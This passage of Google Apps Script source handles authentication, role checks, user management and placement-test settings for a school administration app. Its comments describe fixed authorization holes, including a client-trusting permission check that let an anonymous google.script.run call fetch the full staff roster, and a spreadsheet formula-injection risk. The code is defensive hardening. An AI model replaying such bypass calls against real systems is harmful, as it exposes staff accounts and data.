    if (b < limit) s += TEMP_PW_ALPHABET.charAt(b % n);
  }
  return s;
}

function adminResetPassword(token, targetRole, targetId) {
  const actor = resumeSession(token);
  // `actor` came from resumeSession, so the inline test this replaces was never a
  // hole — but it was the same SHAPE as the nine that were, and leaving one
  // exception means the rule "a guard never reads a permission string itself"
  // cannot be enforced mechanically. _hasPerm_ is equivalent here: resumeSession
  // parks _authUser, so _effectivePerms_ resolves to these very values.
  if (!_hasPerm_(actor.role, actor.permissions, "manage_users")) {
    throw new Error("権限がありません");
  }
  const acct = _findAccountById_(targetRole, targetId);
  if (!acct) throw new Error("対象のユーザーが見つかりません。");

  const temp = _tempPassword_();
  _writeAccountPassword_(acct, temp, true);   // Y = force a change at next login
  _logActivity_({ name: actor.name, id: actor.id, role: actor.role },
               "パスワードリセット", acct.sheetName + ": " + String(acct.row[1] || "") + " (" + targetId + ")", "");
  return { tempPassword: temp, name: String(acct.row[1] || ""), id: targetId };
}


// ==========================================
// BOOT BUNDLE
// ==========================================
// Logging in used to cost four server calls in two serial waves: resumeSession
// on its own, then getDashboardData + notifications + announcements fired
// concurrently. Measured on staging, the sheet reads were never the problem —
// every separate getDataRange() costs ~200-400ms of fixed overhead regardless
// of size (a 2-row Announcements read measured 238ms), and each
// google.script.run call adds ~1s on top while concurrent calls inflate each
// other. getAnnouncements and getPendingNotifications together spent 644ms to
// produce four bytes.
//
// So this collapses the whole boot into ONE call whose reads share ONE
// batchGet. Same idea as getRecruitmentBundle, applied to the path every user
// pays on every page load.

// Gather everything the front-end needs immediately after a user is known.
// Never throws: any piece may come back missing, and setupInterfaceBasedOnRole
// falls back to fetching it the old way. Losing the notification bell must not
// cost someone their login.
function _bootPayload_(user) {
  const role = String(user.role || "");
  const perms = user.permissions;
  let out = {};

  // Prime the memo so the producers below share a single batchGet rather than
  // paying the per-read overhead three times over.
  let want = [];
  const wantsDash = _hasPerm_(role, perms, "view_students") ||
                    _hasPerm_(role, perms, "view_admissions") ||
                    _hasPerm_(role, perms, "view_dorms");
  // Keyed on the PERMISSION, not a role list, so a custom role holding
  // view_admissions gets the feed too. Behaviour-preserving for the built-ins:
  // 営業 holds view_admissions by default.
  const wantsNotif = _isAdminRole_(role) || role === "teacher" ||
                     _hasPerm_(role, perms, "view_admissions");
  if (wantsDash)  want.push("Central_DB");
  if (wantsNotif) want.push("Schedule_DB");
  want.push(SHEET_ANNOUNCEMENTS);
  try { _readTabs_(want); } catch (e) { /* producers will read individually */ }

  if (wantsDash) {
    // Past_DB is deliberately excluded — it is two thirds of the payload and
    // its sub-tab is not the default one. The front-end asks for it on first
    // visit via getDashboardData(role, true).
    try { out.dashboard = getDashboardData(role, false); } catch (e) {}
  }

  if (wantsNotif) {
    try {
      out.notifications = (role === "teacher")
        ? getTeacherNotifications(user.id)
        : getPendingNotifications(user.name);
    } catch (e) {}
  }

  try { out.announcements = getAnnouncements(role, perms, user.id); } catch (e) {}

  return out;
}

// Resume path: one call replacing resumeSession + three follow-ups.
// Throws exactly what resumeSession throws, so the front-end's existing
// "token invalid, show the PIN entry" handling is unchanged.
// True when this account still has to set a password: either it has no hash at
// all (never migrated off a PIN, or newly created) or an admin reset flagged it.
// Master is exempt — its credential is a script property, not a sheet row.
function _accountNeedsPassword_(user) {
  if (_isMasterRole_(user.role)) return false;
  try {
    const acct = _findAccountById_(user.role, user.id);
    if (!acct) return false;
    const hasHash = String(acct.row[6] || "").trim() !== "";
    const mustChange = String(acct.row[10] || "").trim() === "Y";
    return !hasHash || mustChange;
  } catch (e) { return false; }   // never lock somebody out over a read failure
}

function getBootBundle(token) {
  const user = resumeSession(token);
  // A live session predating the password change would otherwise sail straight
  // past the migration: resumeSession only re-reads the user's row, it never
  // checks for a credential. Without this, everyone already logged in keeps
  // using the app on an old PIN-era session and is never asked to set anything.
  // The same applies to a user an admin resets while they are logged in.
  const mustSetPassword = _accountNeedsPassword_(user);
  return {
    user: user,
    mustSetPassword: mustSetPassword,
    boot: mustSetPassword ? null : _bootPayload_(user)
  };
}


// ==========================================
// PLACEMENT TEST DASHBOARD
// ==========================================
// Config is stored in a "PlacementTest_Config" sheet, one row per intake:
//   Intake Name | Results URL | Tab Name | Entry Link | Sort Order
// Admins (with manage_placement) edit these rows from the front-end. The
// dashboard reads result data live from each intake's external spreadsheet.
const PLACEMENT_CONFIG_SHEET = 'PlacementTest_Config';

// The master account is its own role ("master") but ranks above admin, so every
// admin-level gate must accept it. Routing all role tests through this helper
// means adding a role can't silently lock the master out of one forgotten check.
// ⚠️ These five helpers still TAKE role/perms and then, when enforcing, ignore
// them in favour of the session (see _effectiveRole_). That looks wrong and is
// deliberate: it fixes ~93 call sites without touching one of them, including
// the internal calls like _bootPayload_'s. Changing the signatures instead would
// mean rewriting 85 declarations and 105 client call sites in a 10k-line file.
//
// The consequence to keep in mind: passing a role to these means nothing. There
// is exactly one caller identity per execution and it comes from the token.
// ⚠️ TWO PREDICATES, DELIBERATELY. Read this before using either.
//
// _isAdminRole_  — is the caller LITERALLY 管理者 or master. Governs BEHAVIOUR:
//                 which notification feed they get, and whether ホーム shows them
//                 an interview list. A 教務部 manager holding admin power is still
//                 教務部 for those, so this must NOT widen.
//
// _isAdminLevel_ — may the caller perform the seven operations no tickable
//                 permission grants: restoreSnapshot, getSnapshotList,
//                 getActivityLog, diagnoseInChargeMatching, deleteBuilding
//                 (cascade), saveDestinationAlias, saveDestinationOverride.
//                 A custom role flagged 管理者権限 passes this while keeping its
//                 own 表示名 — the point of the whole feature: a department
//                 manager gains the ability to fix things without their role
//                 being renamed 管理者 on screen.
//
// Adding a new admin-only operation? It almost certainly wants _isAdminLevel_.
function _isAdminRole_(role) {
  const r = _effectiveRole_(role);
  return r === "admin" || r === "master";
}

// ⚠️ The ONLY place the two admin-level sources are combined. Anything that
// re-derives admin-ness elsewhere will drift from it; the client mirrors
// user.isAdmin rather than inspecting either flag, for the same reason.
function _isAdminLevel_(role) {
  const r = _effectiveRole_(role);
  if (r === "admin" || r === "master") return true;
  // The person's own 管理者権限. Read from the SESSION, never from an argument —
  // every caller of this asks "is the caller allowed", so the session is the right
  // subject, and a client-supplied flag would be no guard at all.
  // ⚠️ Absent in observe mode (no session); fall through to the role answer rather
  // than throwing, so a flip of AUTH_ENFORCE cannot take the app down.
  if (_authUser && _authUser.adminUser === true) return true;
  const def = _roleByKey_(r);
  return !!(def && def.admin);
}
function _isMasterRole_(role) { return _effectiveRole_(role) === "master"; }

// ⚠️ Literal test of the STRING PASSED IN, ignoring the session. Use this — not
// _isMasterRole_ — when the role describes somebody other than the caller, or is
// being used to pick a sheet rather than to authorize. Two places would break
// outright otherwise:
//   - _resolveUserById_ asks "is the row I am resolving the master row", during
//     resumeSession, before any session exists. The session-aware version
//     returns false there and revokes every master session.
//   - saveSystemUser asks "is the role being ASSIGNED master". The session-aware
//     version would read the caller's role instead, so an admin could grant
//     somebody the master role.
function _isMasterRoleLiteral_(role) { return String(role || "") === "master"; }

// "Is the caller one of these roles." Replaced an inline `_isAdminRole_(userRole)
// || userRole === "sales"` shape that was half-fixed and therefore not fixed:
// _isAdminRole_ consults the session, but the string comparison beside it still
// read what the browser sent, so passing "sales" walked straight through.
//
// It now has exactly ONE caller, _permOrLegacyRole_, and that is deliberate: a
// role list is the wrong question for an ordinary screen (see the note there).
// If you are about to add a second caller, you probably want a permission.
function _roleIsAnyOf_(role, allowed) {
  const r = _effectiveRole_(role);
  if (r === "master" || r === "admin") return true;   // as _isAdminRole_ allows
  return allowed.indexOf(r) !== -1;
}

// ⚠️ Ten screens were guarded as "is the caller 営業" — a role list written before
// roles could be created, so EVERY custom role was refused however its permissions
// were ticked. 学生数 and 部屋一覧 were the visible symptom: the sidebar gates on
// view_students / view_dorms so the tab appeared, and the data behind it threw
// 権限がありません.
//
// The permission is the real question. The legacy role list is kept as an OR so
// the built-ins behave EXACTLY as before — notably a 教務 who was never given the
// permission at all, and admin/master, which _roleIsAnyOf_ lets through.
// (It also means a 営業 without view_dorms still reaches getDormData. That is
// pre-existing looseness, not something introduced here; tightening it would lock
// out whoever is relying on it today.)
//
// ⚠️ perms is the LAST parameter at every call site, deliberately. An appended
// argument a caller forgets arrives as `undefined` and falls back to the role
// list — the built-ins keep working and a custom role fails closed. Inserting it
// second would have shifted the existing arguments, so one missed call site would
// have passed `includePast` where `perms` was expected.
function _permOrLegacyRole_(role, perms, needed, legacyRoles) {
  if (_roleIsAnyOf_(role, legacyRoles)) return true;
  return _hasPerm_(role, perms, needed);
}

// ⚠️ REVERSED DECISION. This used to be "only the master bypasses the checkboxes;
// an admin holds exactly what is ticked". 管理者権限 now OVERRIDES the role and grants
// every permission — the flag's whole point is reaching what the person's department
// is not otherwise entitled to see.
//
// What it does NOT reach is the master-only work: 役割管理 (saveRole / deleteRole /
// resetRoleDefaults), お知らせ配信, and granting 管理者権限 itself. Those guard with
// _isMasterRole_, not with a permission, which is what stops a flagged admin promoting
// themselves — the guard tests/roles.test.js §6 and §13 hold.
//
// ✅ No recursion: _isAdminLevel_ reaches _effectiveRole_, _roleByKey_ and _authUser, and
// never comes back here.
// ⚠️ Still fails closed with no session: _effectiveRole_ returns "" when enforcing, and
// "" is neither admin/master nor a known role, so this line denies.
function _hasPerm_(role, perms, needed) {
  if (_isMasterRole_(role)) return true;
  if (_isAdminLevel_(role)) return true;
  const p = _effectivePerms_(perms);
  if (!p) return false;
  let list = Array.isArray(p) ? p : String(p).split(",").map(s => s.trim());
  return list.indexOf(needed) !== -1;
}

function _getPlacementConfigSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(PLACEMENT_CONFIG_SHEET);
  if (!sh) {
    sh = ss.insertSheet(PLACEMENT_CONFIG_SHEET);
    sh.appendRow(["Intake Name", "Course", "Results URL", "Tab Name", "Entry Link", "Sort Order", "Columns"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// Return the list of configured intakes (for building the dashboard tabs and
// the admin management list). Available to anyone with view_placement.
function getPlacementConfig(role, perms) {
  if (!_hasPerm_(role, perms, "view_placement")) throw new Error("権限がありません");
  const sh = _getPlacementConfigSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let rows = [];
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0]).trim() === "") continue;
    rows.push({
      rowIndex: i + 1,
      intakeName: data[i][0],
      course: data[i][1] || "",
      resultsUrl: data[i][2],
      tabName: data[i][3],
      entryLink: data[i][4],
      sortOrder: data[i][5] === "" ? 9999 : Number(data[i][5]) || 9999,
      columns: _parseColumnsCell_(data[i][6])
    });
  }
  rows.sort((a, b) => a.sortOrder - b.sortOrder);
  return rows;
}

// Add or update an intake config row. Requires manage_placement.
function savePlacementConfig(role, perms, cfg) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  if (!cfg || !String(cfg.intakeName || "").trim()) throw new Error("入学期名は必須です。");
  const sh = _getPlacementConfigSheet_();

  const row = [
    String(cfg.intakeName).trim(),
    String(cfg.course || "").trim(),
    String(cfg.resultsUrl || "").trim(),
    String(cfg.tabName || "").trim(),
    String(cfg.entryLink || "").trim(),
    cfg.sortOrder === "" || cfg.sortOrder == null ? "" : Number(cfg.sortOrder)
  ];

  const rowIndex = parseInt(cfg.rowIndex);
  if (rowIndex && rowIndex > 1) {
    sh.getRange(rowIndex, 1, 1, 6).setValues([row]);
    _logActivity_({ role: role, name: cfg._actorName || "", id: cfg._actorId || "" }, "プレイスメント設定更新", cfg.intakeName + " / " + (cfg.course || ""), "");
  } else {
    sh.appendRow(row);
    _logActivity_({ role: role, name: cfg._actorName || "", id: cfg._actorId || "" }, "プレイスメント設定追加", cfg.intakeName + " / " + (cfg.course || ""), "");
  }
  return "保存しました。";
}

// Parse the Columns cell (JSON array of header names) into an array.
function _parseColumnsCell_(cellVal) {
  try {
    let s = String(cellVal == null ? "" : cellVal).trim();
    if (s === "") return [];
    let arr = JSON.parse(s);
    return Array.isArray(arr) ? arr.filter(function(x){ return String(x).trim() !== ""; }) : [];
  } catch (e) { return []; }
}

// Save the per-row visible columns (column 7) for one config row.
// An empty list clears the override (the row will inherit the global default).
function savePlacementRowColumns(role, perms, rowIndex, columns, actorName, actorId) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  const sh = _getPlacementConfigSheet_();
  rowIndex = parseInt(rowIndex);
  if (!rowIndex || rowIndex <= 1) throw new Error("行が不正です。");
  let clean = [];
  if (Array.isArray(columns)) {
    columns.forEach(function(c){ let s = String(c || "").trim(); if (s) clean.push(s); });
  }
  sh.getRange(rowIndex, 7).setValue(clean.length ? JSON.stringify(clean) : "");
  _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "プレイスメント列設定(個別)", "row " + rowIndex, clean.join(", "));
  return "保存しました。";
}

// Delete an intake config row. Requires manage_placement.
function deletePlacementConfig(role, perms, rowIndex, actorName, actorId) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  const sh = _getPlacementConfigSheet_();
  rowIndex = parseInt(rowIndex);
  if (!rowIndex || rowIndex <= 1) throw new Error("行が不正です。");
  let name = "";
  try { name = sh.getRange(rowIndex, 1).getDisplayValue(); } catch (e) {}
  const gone = _sheetRowForLog_(sh, rowIndex);
  sh.deleteRow(rowIndex);
  _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "プレイスメント設定削除", name, gone);
  return "削除しました。";
}

// Reorder config rows: given an ordered array of rowIndexes, rewrite each row's
// Sort Order (column 6) to 1,2,3... in that order. Requires manage_placement.
function reorderPlacementConfig(role, perms, orderedRowIndexes, actorName, actorId) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  if (!Array.isArray(orderedRowIndexes) || orderedRowIndexes.length === 0) return "OK";
  const sh = _getPlacementConfigSheet_();
  _snapshotSheet_(PLACEMENT_CONFIG_SHEET);
  // One read + one write for the whole column. This used to be a setValue per
  // row, so reordering a 12-row config cost 12 round trips.
  const last = sh.getLastRow();
  if (last >= 2) {
    const col = sh.getRange(2, 6, last - 1, 1).getValues();   // Sort Order, rows 2..last
    orderedRowIndexes.forEach(function(ri, i) {
      const r = parseInt(ri);
      // Sheet row r maps to col[r - 2]; guard the bounds so a stale index from the
      // browser can never write past the end of the array.
      if (r && r > 1 && r <= last) col[r - 2][0] = i + 1;    // Sort Order = position
    });
    sh.getRange(2, 6, last - 1, 1).setValues(col);
  }
  _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "プレイスメント表示順を変更", orderedRowIndexes.length + "件", "");
  return "OK";
}

// Read live results for one intake from its external spreadsheet+tab.
// Returns { headers, rows } or { error } if the sheet can't be opened.
// This opens an EXTERNAL spreadsheet by URL and reads up to 5000 rows, which
// makes it the slowest call in the app. Cached per (url, tab, columns).
//
// The data is edited outside the app, so there is no write path to hang a bust
// on — which is why `fresh` exists. The 更新 button passes it, so the one
// control a user reaches for when they suspect stale data actually bypasses the
// cache instead of quietly returning the same stale rows.
function getPlacementResults(role, perms, resultsUrl, tabName, rowColumns, fresh) {
  if (!_hasPerm_(role, perms, "view_placement")) throw new Error("権限がありません");
  if (!resultsUrl || !String(resultsUrl).trim()) return { error: "結果シートのURLが設定されていません。" };

  const ckey = 'placement_' + _shortHash_(String(resultsUrl) + '|' + String(tabName || '') +
                                         '|' + JSON.stringify(rowColumns || []));
  if (fresh) { try { CacheService.getScriptCache().remove('v' + _cacheVersion_() + '_' + ckey); } catch (e) {} }
  return _cached_(ckey, CACHE_TTL_SHORT, function () {
    return _placementResultsUncached_(resultsUrl, tabName, rowColumns);
  });
}

// Cache keys must stay short and free of the characters a URL brings with it.
function _shortHash_(s) {
  let h = 0;
  for (let i = 0; i < s.length; i++) { h = ((h << 5) - h + s.charCodeAt(i)) | 0; }
  return (h >>> 0).toString(36) + '_' + s.length;
}

function _placementResultsUncached_(resultsUrl, tabName, rowColumns) {
  let ss;
  try {
    ss = SpreadsheetApp.openByUrl(String(resultsUrl).trim());
  } catch (e) {
    return { error: "シートを開けませんでした。スクリプトのオーナーに閲覧権限があるか確認してください。" };
  }

  let sheet;
  if (tabName && String(tabName).trim()) {
    sheet = ss.getSheetByName(String(tabName).trim());
    if (!sheet) return { error: "タブ「" + tabName + "」が見つかりません。" };
  } else {
    sheet = ss.getSheets()[0]; // fall back to first tab
  }

  let values;
  try {
    // Read the sheet's full grid dimensions rather than relying on Sheets'
    // "used range" detection (getDataRange). The used-range is a content
    // heuristic that can go stale for externally-populated sheets (bulk
    // pastes, Form-linked response tabs) — the app would then under-read
    // real data until something (e.g. manually re-typing a cell) forces
    // Sheets to notice its own content. getMaxRows/getMaxColumns reflect the
    // sheet's actual grid size, which isn't subject to that staleness, so we
    // read the full grid and trim fully-blank trailing rows ourselves.
    let maxRows = Math.min(sheet.getMaxRows(), 5000); // safety cap — a results sheet won't realistically exceed this
    let maxCols = sheet.getMaxColumns();
    let full = sheet.getRange(1, 1, maxRows, maxCols).getDisplayValues();
    // Trim trailing rows that are entirely blank.
    let lastNonBlank = -1;
    for (let r = 0; r < full.length; r++) {
      if (full[r].some(function(cell){ return String(cell).trim() !== ""; })) lastNonBlank = r;
    }
    values = full.slice(0, lastNonBlank + 1);
  } catch (e) {
    return { error: "データを読み込めませんでした。" };
  }
  if (!values || values.length === 0) return { headers: [], rows: [] };

  let headers = values[0];
  let rows = values.slice(1);

  // Column filter precedence: this row's own columns (if any) -> the global
  // default -> show all columns. An ordered list of header names; columns the
  // sheet lacks are silently skipped.
  let chosen = (rowColumns && Array.isArray(rowColumns) && rowColumns.length > 0)
    ? rowColumns
    : _getPlacementColumns_();
  if (chosen && chosen.length > 0) {
    let keep = [];
    chosen.forEach(function(name) {
      let idx = headers.indexOf(name);
      if (idx !== -1) keep.push(idx);
    });
    if (keep.length > 0) {
      headers = keep.map(function(i) { return values[0][i]; });
      rows = rows.map(function(r) { return keep.map(function(i) { return r[i]; }); });
    }
  }

  return { headers: headers, rows: rows };
}

// --- Global placement column setting (ordered list of header names) ---
const PLACEMENT_COLS_PROP = 'PLACEMENT_VISIBLE_COLUMNS';

function _getPlacementColumns_() {
  try {
    let raw = PropertiesService.getScriptProperties().getProperty(PLACEMENT_COLS_PROP);
    if (!raw) return [];
    let arr = JSON.parse(raw);
    return Array.isArray(arr) ? arr : [];
  } catch (e) { return []; }
}

// Return the saved column setting (for the manage UI). Anyone with view.
function getPlacementColumns(role, perms) {
  if (!_hasPerm_(role, perms, "view_placement")) throw new Error("権限がありません");
  return _getPlacementColumns_();
}

// Save the ordered list of visible columns. Requires manage_placement.
function savePlacementColumns(role, perms, columns, actorName, actorId) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  let clean = [];
  if (Array.isArray(columns)) {
    columns.forEach(function(c) { let s = String(c || "").trim(); if (s) clean.push(s); });
  }
  PropertiesService.getScriptProperties().setProperty(PLACEMENT_COLS_PROP, JSON.stringify(clean));
  _logActivity_({ role: role, name: actorName || "", id: actorId || "" }, "プレイスメント表示列を更新", clean.join(", "), "");
  return "保存しました。";
}

// Load the header row from the first results sheet that opens successfully.
// Used by the manage UI to present real headers as checkboxes. Requires manage.
function getPlacementReferenceHeaders(role, perms) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  const sh = _getPlacementConfigSheet_();
  const data = sh.getDataRange().getDisplayValues();
  for (let i = 1; i < data.length; i++) {
    let url = data[i][2]; // Results URL column
    let tab = data[i][3]; // Tab Name column
    if (!url || !String(url).trim()) continue;
    try {
      let ss = SpreadsheetApp.openByUrl(String(url).trim());
      let sheet = (tab && String(tab).trim()) ? ss.getSheetByName(String(tab).trim()) : ss.getSheets()[0];
      if (!sheet) continue;
      let values = sheet.getDataRange().getDisplayValues();
      if (values && values.length > 0 && values[0].length > 0) {
        return { headers: values[0].filter(function(h){ return String(h).trim() !== ""; }), source: data[i][0] };
      }
    } catch (e) { continue; }
  }
  return { headers: [], source: "" };
}

// Load headers from a specific results sheet (for the per-row column picker).
function getPlacementHeadersForUrl(role, perms, resultsUrl, tabName) {
  if (!_hasPerm_(role, perms, "manage_placement")) throw new Error("権限がありません");
  if (!resultsUrl || !String(resultsUrl).trim()) return { headers: [], error: "結果シートのURLが設定されていません。" };
  try {
    let ss = SpreadsheetApp.openByUrl(String(resultsUrl).trim());
    let sheet = (tabName && String(tabName).trim()) ? ss.getSheetByName(String(tabName).trim()) : ss.getSheets()[0];
    if (!sheet) return { headers: [], error: "タブが見つかりません。" };
    // Same robust read as getPlacementResults — avoid relying on the
    // potentially-stale "used range" (getDataRange) for externally-populated
    // sheets. Read the real grid size and find the first non-blank row.
    let maxRows = Math.min(sheet.getMaxRows(), 5000);
    let maxCols = sheet.getMaxColumns();
    let full = sheet.getRange(1, 1, maxRows, maxCols).getDisplayValues();
    if (full.length > 0 && full[0].some(function(h){ return String(h).trim() !== ""; })) {
      return { headers: full[0].filter(function(h){ return String(h).trim() !== ""; }) };
    }
    return { headers: [] };
  } catch (e) {
    return { headers: [], error: "シートを開けませんでした。閲覧権限を確認してください。" };
  }
}


// --- USER MANAGEMENT ENGINE ---
// ⚠️ This returns every staff and teacher account — name, email, role,
// permissions and password state. It was guarded as
// `!_isMasterRole_(userRole) && (!perms || !perms.includes("manage_users"))`,
// where the half after && read the string the BROWSER sent. OR'd like that the
// client-trusting half decides on its own, so
// google.script.run.getSystemUsers("", "manage_users") returned the whole roster
// to an anonymous caller — including which accounts still show 未設定 /
// PIN移行待ち, i.e. exactly who to attack next. Session-only now.
function getSystemUsers(userRole, perms) {
  if (!_hasPerm_(userRole, perms, "manage_users")) throw new Error("権限がありません");
  
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sSheet = ss.getSheetByName("Staff_Master");
  let tSheet = ss.getSheetByName("Teacher_Master");
  
  // Deliberately does NOT return the PIN any more. It used to, and the user
  // management table printed it in a column — which meant an admin screen
  // displayed every colleague's working credential in plaintext. Only a status
  // is returned now; the password itself is a hash and cannot be read back.
  const pwState = function (row) {
    if (String(row[6] || "").trim() === "") {
      return String(row[2] || "").trim() !== "" ? "PIN移行待ち" : "未設定";
    }
    return String(row[10] || "").trim() === "Y" ? "要変更" : "設定済み";
  };

  let users = [];
  if(sSheet) {
    let sData = sSheet.getDataRange().getDisplayValues();
    for(let i=1; i<sData.length; i++) {
      if(sData[i][0]) users.push({ role: _staffRoleFromRow_(sData[i]), id: sData[i][0], name: sData[i][1], pwStatus: pwState(sData[i]), email: sData[i][3], notif: sData[i][4], permissions: sData[i][5] || "", adminUser: _adminFlagFromRow_(sData[i]) });
    }
  }
  if(tSheet) {
    let tData = tSheet.getDataRange().getDisplayValues();
    for(let i=1; i<tData.length; i++) {
      if(tData[i][0]) users.push({ role: 'teacher', id: tData[i][0], name: tData[i][1], pwStatus: pwState(tData[i]), email: tData[i][3], notif: tData[i][4], permissions: tData[i][5] || "", adminUser: _adminFlagFromRow_(tData[i]) });
    }
  }
  return users;
}

// ⚠️ Creates and edits staff/teacher accounts, including their permissions.
// The guard was `!_isMasterRole_(adminRole) && (!adminPerms || !adminPerms
// .includes("manage_users"))` — the half after && read the browser's own claim,
// and OR'd that way it decided on its own. An anonymous caller could add or
// re-permission an account. The master-only check on the 管理者権限 flag below
// was always session-aware; this line was not.
function saveSystemUser(u, adminRole, adminPerms) {
  if (!_hasPerm_(adminRole, adminPerms, "manage_users")) throw new Error("権限がありません");
  
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  // "master" is reserved for the SYSTEM_PIN account and is never stored in a
  // sheet. Without this guard a crafted call could create a Staff_Master row with
  // role "master", which _isAdminRole_ would then treat as admin-level.
  if (_isMasterRoleLiteral_(u.role)) throw new Error("この権限は付与できません。");
  // ⚠️ `admin` is likewise NEVER assignable — not even by the master. 管理者権限 on
  // a custom role replaced it: that grants the same seven operations while the
  // person still displays as their department. Leaving `admin` assignable would
  // mean two ways to grant one thing, and the one that renames somebody 管理者 on
  // every screen, which is the opposite of what the flag exists for.
  //
  // READING it stays valid — _staffRoleFromRow_ still resolves a stored "admin", so
  // a row hand-edited in the sheet is honoured rather than silently demoted. Only
  // the write path is closed.
  if (String(u.role || "") === "admin") {
    throw new Error("管理者ロールは割り当てできません。役割の「管理者権限」をお使いください。");
  }
  // ⚠️ And the role has to be one that EXISTS. Until this check, any string was
  // accepted: a crafted call could store role "xyz", producing an account that
  // matches no branch anywhere — it would log in and see an app with nothing in
  // it, with no error to explain why. The dropdown never offered it, but the
  // dropdown is not the control.
  if (!_roleByKey_(u.role)) throw new Error("役割「" + String(u.role || "") + "」は存在しません。");
  // ⚠️ ESCALATION GUARD. `admin` is not just a permission bundle: _isAdminRole_
  // gates seven operations that NO tickable permission grants — restoreSnapshot,
  // getSnapshotList, getActivityLog, diagnoseInChargeMatching, deleteBuilding
  // (cascade), saveDestinationAlias and saveDestinationOverride.
  //
  // Before custom roles the dropdown offered only 営業 and 教務 and the role was
  // frozen on edit, so nobody could reach `admin` through the UI at all. Making
  // roles selectable removed both of those accidental barriers at once: without
  // this line, anyone holding manage_users could edit their OWN row to `admin`
  // and pick up all seven. So granting it is master's call, exactly like defining
  // a role at all.
  // ⚠️ Any admin-LEVEL role, not just the literal key. A custom role carrying
  // 管理者権限 grants the same seven operations, so if this only checked "admin"
  // the flag would be a way around the guard: an admin with manage_users could
  // assign themselves a department role that happens to be flagged.
  // `admin` itself is already refused above, so what is left to police here is the
  // flag: a custom role carrying 管理者権限 grants the same seven operations, and
  // handing one out stays master's call. Without this an admin holding manage_users
  // could assign themselves a flagged department role.
  const _tgt = _roleByKey_(u.role);
  if (_tgt && _tgt.admin && !_isMasterRole_(adminRole)) {
    throw new Error("管理者権限のある役割の付与はマスターのみ可能です。");
  }
  // ⚠️ The per-PERSON 管理者権限 is master's call for exactly the same reason as the
  // per-role one: it grants the seven operations no tickable permission grants. An
  // admin holding manage_users must not be able to tick it for themselves.
  // Requested-but-not-permitted is refused rather than silently dropped — a flag that
  // appears to save and does not is worse than an error.
  const _wantAdminUser = (u.adminUser === true || String(u.adminUser || "").toUpperCase() === "Y");
  if (_wantAdminUser && !_isMasterRole_(adminRole)) {
    throw new Error("管理者権限の付与はマスターのみ可能です。");
  }
  const sheetName = u.role === "teacher" ? "Teacher_Master" : "Staff_Master";
  let sheet = ss.getSheetByName(sheetName);
  if(!sheet) {
    sheet = ss.insertSheet(sheetName);
    sheet.appendRow(["ID", "Name", "PIN", "Email", "Notifications", "Permissions"]);
  }
  
  let data = sheet.getDataRange().getDisplayValues();

  // ⚠️ A NEW user whose ID already exists used to take the UPDATE branch below — with oldId
  // blank the search matches on u.id — and silently overwrote a colleague's name, email and
  // permissions. ユーザー管理 now issues a temporary password straight after creating a user,
  // which would have turned that overwrite into a password reset of the colleague as well.
  // Compared TRIMMED, so 「S01 」 cannot slip past as a near-duplicate row. Editing sends oldId
  // and never reaches this, so the guard only ever refuses the accidental case.
  if (!u.oldId) {
    const wantId = String(u.id || "").trim();
    for (let i = 1; i < data.length; i++) {
      if (String(data[i][0] || "").trim() === wantId) {
        throw new Error("ID「" + wantId + "」はすでに使われています。別のIDを入力してください。");
      }
    }
  }

  let rowIndex = -1;
  let searchId = u.oldId ? u.oldId : u.id; 
  for(let i=1; i<data.length; i++){
    if(data[i][0] === searchId) { rowIndex = i + 1; break; }
  }
  
  let perms = u.permissions || "";
  // Teacher_Master rows are 'teacher' by virtue of the sheet; only staff rows
  // carry a role, and the column is created the first time one is written.
  if (sheetName === "Staff_Master") _ensureRoleColumn_(sheet);
  _ensureAdminFlagColumn_(sheet);   // both sheets — the flag is on the person
  // Column 3 (PIN) is no longer written by this form — accounts use hashed
  // passwords now. It is left blank for new users and, on edit, is untouched so a
  // user mid-migration keeps the old PIN that still lets them in once.
  //
  // Writing only columns 1-6 also leaves the password columns (7-11) alone, which
  // is what stops an ordinary user edit from wiping somebody's credentials.
  if(rowIndex > -1) {
    // ⚠️ Through _cellSafeRow_, wrapping the ARRAY. These are typed by an admin, and a name
    // or email starting with = + or - became a live formula in the staff sheet — the
    // Sessions-reading IMPORTXML of "The recurring bug class". ID and name are one write:
    // the columns are adjacent, and column 3 (the old PIN) stays untouched.
    sheet.getRange(rowIndex, 1, 1, 2).setValues([_cellSafeRow_([u.id, u.name])]);
    sheet.getRange(rowIndex, 4, 1, 3).setValues([_cellSafeRow_([u.email, u.notif ? "ON" : "OFF", perms])]);
    if (sheetName === "Staff_Master") sheet.getRange(rowIndex, STAFF_COLS).setValue(u.role);
    // ⚠️ Only the master may CHANGE this, so a non-master edit must leave whatever is
    // already there untouched rather than clearing it — an admin editing a flagged
    // colleague's email would otherwise silently strip their admin level.
    if (_isMasterRole_(adminRole)) sheet.getRange(rowIndex, ADMIN_FLAG_COL).setValue(_wantAdminUser ? "Y" : "");
  } else {
    sheet.appendRow(_cellSafeRow_([u.id, u.name, "", u.email, u.notif ? "ON" : "OFF", perms]));
    if (sheetName === "Staff_Master") sheet.getRange(sheet.getLastRow(), STAFF_COLS).setValue(u.role);
    if (_wantAdminUser) sheet.getRange(sheet.getLastRow(), ADMIN_FLAG_COL).setValue("Y");
    // A brand-new account has no password yet. The admin must issue one with
    // adminResetPassword — until then the user cannot log in at all, which is the
    // intended state rather than a gap.
  }
  _logActivity_({ role: adminRole, name: u._actorName || "", id: u._actorId || "" }, (rowIndex > -1 ? "ユーザー更新" : "ユーザー追加"), sheetName + ": " + u.name + " (" + u.id + ")", "");
  return "ユーザーを保存しました。";
}

// See saveSystemUser — identical client-trusting OR, on the path that DELETES an
// account.
function deleteSystemUser(id, role, adminRole, adminPerms, actorName, actorId) {
  if (!_hasPerm_(adminRole, adminPerms, "manage_users")) throw new Error("権限がありません");

